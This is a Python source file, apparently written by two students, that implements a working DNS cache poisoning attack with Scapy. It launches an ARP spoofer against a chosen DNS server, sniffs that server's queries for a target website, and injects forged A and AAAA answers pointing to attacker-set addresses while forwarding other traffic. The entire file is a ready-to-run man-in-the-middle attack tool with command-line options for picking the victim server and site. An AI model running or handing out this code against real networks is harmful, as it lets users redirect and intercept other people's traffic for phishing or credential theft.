# Daniel Yochanan 322406232
# Avi Feder 208199638
import argparse
import os
import threading

from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, sniff, sendp


parser = argparse.ArgumentParser(description="DNS cache poisoning System. By Daniel Yochanan and Avi Feder")
parser.add_argument("-i", "--IFACE", type=str, metavar='', help="Interface you wish to use")
parser.add_argument("-d", "--DNS", type=str, metavar='', required=True, help="dns Server you wish to attack")
parser.add_argument("-w", "--WEBSITE", type=str, metavar='', required=True, help="website you wish to attack")
args = parser.parse_args()
interface = args.IFACE if (args.IFACE is not None) else conf.iface
website = args.WEBSITE if (args.WEBSITE is not None) else "dlink"
dns_ip = args.DNS if (args.DNS is not None) else "192.168.68.114"
default_gateway_ip = conf.route.route("0.0.0.0")[2]




def get_mac(ip):
    p = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, pdst=ip)
    result = srp(p, verbose=False, iface=interface)[0]
    return result[0][1].hwsrc if result else None


default_gateway_mac = get_mac(default_gateway_ip)
dns_mac = get_mac(dns_ip)
hacker_mac = get_if_hwaddr(interface)

threading.Thread(target=os.system, args=("python ArpSpoofer.py -t {} -d 0 -i {}".format(dns_ip, interface),)).start()


def dns_spoofing(packet):
    try:
        if IP in packet and packet[IP].src == dns_ip and DNSQR in packet and website in packet[DNSQR].qname.decode(
                "utf-8") and packet.qd.qtype == 1:
            answer = Ether(src=hacker_mac, dst=packet[Ether].src) / IP(src=packet[IP].dst,
                                                                                dst=packet[IP].src) / UDP(
                sport=packet[UDP].dport, dport=packet[UDP].sport) / DNS(id=packet[DNS].id, qr=1, qd=packet[DNS].qd,
                                                                        an=DNSRR(rrname=packet[DNS].qd.qname, type='A',
                                                                                 ttl=6000,
                                                                                 rdata='192.168.68.1'))
            sendp(answer, verbose=False, iface=interface)
        elif IP in packet and packet[IP].src == dns_ip and DNSQR in packet and website in packet[DNSQR].qname.decode(
                "utf-8") and packet.qd.qtype == 28:
            answer = Ether(src=hacker_mac, dst=packet[Ether].src) / IP(src=packet[IP].dst,
                                                                                dst=packet[IP].src) / UDP(
                sport=packet[UDP].dport, dport=packet[UDP].sport) / DNS(id=packet[DNS].id, qr=1, qd=packet[DNS].qd,
                                                                        an=DNSRR(rrname=packet[DNS].qd.qname,
                                                                                 type='AAAA',
                                                                                 ttl=6000,
                                                                                 rdata='3e84:6aff:feac::2f2c'))

            sendp(answer, verbose=False, iface=interface)
        else:
            packet[Ether].dst = default_gateway_mac
            sendp(packet, verbose=False, iface=interface)
    except:
        None


def main():
    print("startup DNS cache poisoning")
    sniff(store=False, prn=dns_spoofing,
          lfilter=lambda packet: Ether in packet and packet[Ether].src == dns_mac and packet[Ether].dst == hacker_mac,
          iface=interface)


if __name__ == '__main__':
    main()
